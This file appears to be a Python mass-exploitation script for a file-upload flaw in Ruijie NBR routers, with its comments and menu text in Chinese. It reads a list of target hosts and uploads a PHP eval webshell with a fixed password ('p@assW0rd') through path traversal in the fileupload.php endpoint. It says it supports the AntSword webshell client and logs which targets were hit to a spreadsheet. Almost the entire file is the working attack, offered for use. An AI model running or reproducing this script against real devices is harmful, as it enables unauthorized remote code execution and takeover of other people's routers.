
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork


def help():
    print('''
    app="Ruijie-NBR路由器"
        1. 上传webshell, 密码p@assW0rd, 支持蚁剑
    x. 退出
    ''')

def vul_ddi(url):
    webshell = str(Tool.rand_word())+'.php'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
        "Accept": "text/plain, */*; q=0.01",
        "Content-Disposition": f'form-data; name="file"; filename="1.txt"',
        "Content-Type": "image/jpeg"
        # Add more headers as needed
    }
    method = "POST"
    path = f"/ddi/server/fileupload.php?uploadDir=../../321&name={webshell}"
    body = "<?php @eval($_POST['p@assW0rd']);?>"
    notes = ''
    return (url, method, headers, body, path, notes)

def run():
    OUTDIR = "result/锐捷 NBR"
    file = "dat.txt"
    li = Tool.read_host_file(file)
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    Tool.create_directory(OUTDIR)
    help()
    try:
        num = int(input("执行的指令: "))
    except ValueError:
        num = 99999

    if num == 1:
        data = []
        for url in li:
            item = vul_ddi(url)
            data.append(item)

        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/锐捷 NBR 文件上传上漏洞.xlsx")

    else:
        print('bye....')
